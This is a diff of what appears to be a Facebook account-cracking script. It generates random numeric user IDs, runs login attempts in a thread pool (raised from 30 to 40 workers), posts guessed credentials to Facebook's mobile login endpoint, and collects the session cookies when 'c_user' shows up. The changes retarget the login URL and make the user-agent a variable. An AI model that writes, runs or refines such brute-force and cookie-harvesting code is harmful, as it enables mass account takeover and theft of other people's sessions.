@@ -222,7 +222,7 @@ def ASRAF():
 		kodb = ''.join(random.choice(string.digits) for _ in range(2))
 		nmp = ''.join(random.choice(string.digits) for _ in range(4))
 		user.append(nmp)
-	with ThreadPool(max_workers=30) as yaari:
+	with ThreadPool(max_workers=40) as yaari:
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
@@ -284,9 +284,9 @@ def b(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'user-agent': pro,
     'viewport-width': '980',}
-            lo = session.post('https://x.facebook.com/nt/screen/?params=%7B%22token%22%3A%22AVhEK-LfvJlMcR8-6_xOYYwrJBgR3peVNp-TRM2H1vrLHZ845O-D_eCoxqk2eWfJUMpS-2sbvftAfqYChRARYejEU6Xh-qnytTT_BR4_3dgaEA6rX5foG8fASLCWpnsKjj32dCujpZddeHvwUVuyXwvp2hNQ5Hfoj8XIl4QNm1x8x-UCxm-eJoEmKicnjges7VCFwTBsPnmdvUBUCLSiZkUN3_VsGCg1i6uXyfZSMEf4Xf2bpJ38D8AC3rbJRCOo8-4BTEeD41xckbfpPSDiTe-0bvdD5wVsZVvG2tAUVkPxmbT1HKDAiuazolj3Fnh73H8harOLhbhqn0PVYkL4u-kV0syJTwzFBVTkM3IDlDj9vh4CAo-51_dNkuL6%22%7D&path=%2Fnt%2Fcheckpoint%2F828281030927956%2Fintro&paipv=0&eav=AfZPG_YUDxZmpXMk_cNZ9SB4lDUdDS1hYRNG0NYt3yTw7kHSKjOMVj0pgynYlr6KS5g&wtsid=rdr_08qK29jLlx4H5L6JA&_rdr',data=log_data,headers=header_freefb).text
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             cookies=cookies,log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
